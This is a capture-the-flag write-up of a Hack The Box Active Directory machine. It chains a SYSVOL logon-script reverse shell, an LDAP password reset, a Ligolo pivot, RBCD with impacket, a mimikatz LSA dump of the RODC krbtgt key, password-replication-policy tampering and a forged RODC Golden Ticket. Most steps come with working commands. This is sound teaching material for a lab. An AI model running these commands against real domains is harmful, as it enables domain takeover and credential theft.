# Garfield — HTB Write-up

**Author:** DonMorpheus (lab) + Ania  
**Machine:** Garfield (Windows / Active Directory)  
**Domain:** `garfield.htb`  
**Hosts:** `DC01` (writable DC, Server 2019), `RODC01` (read-only DC, Hyper-V internal LAN)  
**Scope:** HTB VPN / personal lab only  

> **No flags, hashes, or live passwords** in this document.

---

## TL;DR

| Phase | Vector |
|-------|--------|
| Recon | Classic AD on `DC01` — LDAP/SMB as a low-priv domain user; WinRM denied |
| User | GenericWrite-style ACL: set **`scriptPath`** on `l.wilson` + writable **SYSVOL `scripts\`** → logon-script reverse shell |
| Lateral | From Liz: **LDAP ADSI `SetPassword`** on `l.wilson_adm` (WinNT/`net user` = Access Denied). ADM has WinRM |
| Pivot | Ligolo from ADM on DC01 into **Hyper-V vSwitch `192.168.100.0/24`**. DC NIC is `.1`; **RODC is `.2`** (not in `ipconfig` on DC01) |
| RODC | MAQ → machine account → **RBCD** on `RODC01$` → S4U `getST -impersonate Administrator` → CIFS as DA **on the RODC** |
| Dump | Remote Registry/SAM/LSA as DA; NTDS on RODC is a **filtered replica** (VSS/IFM often empty of `unicodePwd`). **`lsadump::lsa /inject`** as SYSTEM yields **`krbtgt_<RODC>`** |
| PRP | ADM → group **RODC Administrators** → clear **`msDS-NeverRevealGroup`**, add `Administrator` to **`msDS-RevealOnDemandGroup`** |
| DA | **RODC Golden Ticket** (`ticketer`, ticket `kvno = <rodcId> << 16`, AES of `krbtgt_<id>`) against **`DC01`**. KERB-KEY-LIST may still reject DA; the GT was enough for SMB/WMI as Administrator |

---

## Lab setup

```bash
echo '<TARGET_IP>  garfield.htb DC01.garfield.htb DC01' | sudo tee -a /etc/hosts
```

**Do not reuse the short name `DC01` if other labs already mapped it** — Kerberos/keylist will hit the wrong host (`Connection refused` on port 88). Prefer the FQDN or a dedicated hosts line at the **top**.

Typical DC01 surface: **53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 3389, 5985, 9389**.  
`RODC01` is **not** on the HTB IP; it lives on the internal Hyper-V network.

Starting creds: a low-priv domain user (Jon Arbuckle / `j.arbuckle`). SMB + LDAP valid, **WinRM not**.

---

## 1. Domain picture

```bash
nxc smb  garfield.htb -u j.arbuckle -p '<PASS>'
nxc ldap garfield.htb -u j.arbuckle -p '<PASS>' --users --computers --groups
```

- Users: `Administrator`, `j.arbuckle`, `l.wilson`, `l.wilson_adm`, `krbtgt`, **`krbtgt_<id>`** (RODC KDC).
- Computers: `DC01$`, `RODC01$`.
- Custom groups: **IT Support** (Jon), **Tier 1** (`l.wilson_adm`), **RODC Administrators** (empty at start).
- `l.wilson` / `l.wilson_adm` ∈ Remote Management Users + Remote Desktop Users.
- MAQ default **10**. AS-REP / Kerberoast empty.

`RODC01` `msDS-KrbTgtLink` → `krbtgt_<id>`. Password replication policy (PRP) starts as stock NeverReveal (Denied RODC PRP, Operators, Administrators) + RevealOnDemand = Allowed RODC PRP only.

---

## 2. User — logon script on Liz

Jon has **write** on `l.wilson` (and ADM). Useful attribute: **`scriptPath`**.

Logon scripts resolve under **NETLOGON** = `\\DC\SYSVOL\<domain>\scripts\`.

```bash
# SYSVOL scripts is writable as Jon
smbclient //<DC>/SYSVOL -U 'garfield.htb/j.arbuckle%<PASS>' \
  -c 'put printerDetect.bat garfield.htb\scripts\printerDetect.bat'

# LDAP
# scriptPath = printerDetect.bat
```

Lab bot logs `l.wilson` on a cycle (or when `scriptPath` **changes**). Upload the **real** payload **before** that logon; dummy `echo` files and listeners started after lastLogon miss the window.

Staging: `.bat` downloads a PS reverse shell over **80**, callback on **443** (high ports often filtered). Keep **443** free of other C2.

From the Liz shell: `garfield\l.wilson` on `DC01`.

---

## 3. ADM password — LDAP ADSI, not `net user`

```powershell
# DENIED (SAM / WinNT)
([ADSI]"WinNT://GARFIELD/l.wilson_adm,user").SetPassword("...")

# OK (LDAP extended right ForceChangePassword / write on unicodePwd)
$u = [ADSI]"LDAP://CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb"
$u.psbase.Invoke("SetPassword", "...")
```

`bloodyAD get writable` showing **WRITE** on a user is **not** the same as WinNT reset. Confirm with LDAP.

`l.wilson_adm` → **WinRM Pwn3d** on DC01 (Tier 1, not Domain Admin; no `C$`/`ADMIN$` as ADM).

---

## 4. Why `192.168.100.2` is missing from `ipconfig`

On DC01:

| Adapter | Address | What |
|---------|---------|------|
| `Ethernet` (vmxnet3) | HTB IP | lab VPN / WAN |
| `vEthernet (Switch01)` | `192.168.100.1/24` | Hyper-V virtual switch |

`ipconfig` lists **this host’s addresses**. `.2` is **another VM** on the same L2: **RODC01**, gateway `.1`. Unreachable from Kali until a **pivot** (Ligolo/Chisel) from a process on DC01.

Run the Ligolo **agent** in a **held** WinRM job (or a logon session). WinRM otherwise kills children when the command returns.

Route on Kali: `192.168.100.0/24` via `ligolo`. Then SMB/WinRM/RDP to `.2` as ADM.

---

## 5. RBCD on the RODC

```bash
impacket-addcomputer 'garfield.htb/l.wilson_adm:<PASS>' \
  -computer-name 'FAKE01' -computer-pass '<MACHINE_PASS>' -dc-ip <DC_IP>

impacket-rbcd -delegate-from 'FAKE01$' -delegate-to 'RODC01$' \
  -action write 'garfield.htb/l.wilson_adm:<PASS>' -dc-ip <DC_IP>

impacket-getST -spn 'cifs/RODC01.garfield.htb' -impersonate Administrator \
  -dc-ip <DC_IP> 'garfield.htb/FAKE01$:<MACHINE_PASS>'

export KRB5CCNAME=Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache
# need: RODC01.garfield.htb → 192.168.100.2
nxc smb RODC01.garfield.htb -k --use-kcache   # Pwn3d, C$/ADMIN$ WRITE
```

S4U is **only** for services on `RODC01$`, not `DC01$`.

---

## 6. Dumping `krbtgt_<RODC>`

DRSUAPI DCSync **against the RODC** often returns RPC `0x57`.  
**VSS copy of `NTDS.dit`:** PEK decrypts, **user `unicodePwd` rows are empty** (RODC replica).  
**`ntdsutil ifm "create rodc"`** converts media and **strips secrets**.

What works: WMI/SMB as DA on the RODC, **SYSTEM token**, then:

```text
lsadump::lsa /inject /name:krbtgt_<id>
```

You want **NT hash + AES256** of that RODC krbtgt. DCSync from RODC to DC01 as the impersonated DA token can still fail (RODC is not a full DC for `DomainControllerInfo`; bind as SYSTEM uses the machine account).

---

## 7. PRP — required for Key List, useful anyway

`l.wilson_adm` cannot write `msDS-NeverRevealGroup` until it is in **RODC Administrators** (that group holds WriteProperty on Reveal/NeverReveal).

```bash
# Add self, then re-bind LDAP (new tokenGroups)
bloodyad ... add groupMember 'RODC Administrators' 'l.wilson_adm'

# clear NeverReveal; add Administrator DN to RevealOnDemand
```

`Denied RODC Password Replication Group` still lists Domain Admins globally. Clearing **per-RODC** NeverReveal is the lever the box teaches.

---

## 8. RODC Golden Ticket (Impacket)

Stock Kali `ticketer.py` hardcodes ticket `kvno = 2`. For an RODC krbtgt the KDC expects:

```text
kvno = <RODC krbtgt RID suffix> << 16
# e.g. krbtgt_8245  →  8245 << 16
```

Patch that assignment, then:

```bash
python3 ticketer-rodc.py -aesKey <AES256_of_krbtgt_RODC> \
  -domain garfield.htb -domain-sid <DOMAIN_SID> -user-id 500 Administrator

export KRB5CCNAME=./Administrator.ccache
nxc smb DC01.garfield.htb -k --use-kcache   # Domain Admin on the writable DC
```

`impacket-keylistattack LIST -rodcNo <id> -rodcKey <AES256> -kdc DC01.garfield.htb -t Administrator`  
parses `-kdc FQDN` as **short name** (`split('.', 1)`). Combined with a polluted `DC01` hosts entry this looks like a dead KDC. After hosts hygiene, Key List may still answer *user is not allowed to have passwords replicated*. The **Golden Ticket** was sufficient for DA on DC01.

---

## 9. Root

As Administrator on `DC01`: `C$`, WMI, `Desktop\root.txt`.

Cleanup: remove `FAKE01$`, restore PRP / `scriptPath`, drop Ligolo/listeners, **unpollute `/etc/hosts`**.

---

## Lessons

- **`WRITE` in bloodyAD ≠ WinNT SetPassword.** Use LDAP ADSI for FCP.
- Logon scripts fire **once per logon**; payload + listener must be ready **before** lastLogon.
- Internal Hyper-V IPs are **neighbors**, not extra addresses on the DC.
- RODC NTDS is not a full secrets dump; **RODC krbtgt lives in LSA** on that box.
- RODC Golden Ticket `kvno` is **not** `2`.
- Never leave **`DC01`** as a short name shared across labs.

Educational HTB lab material only.
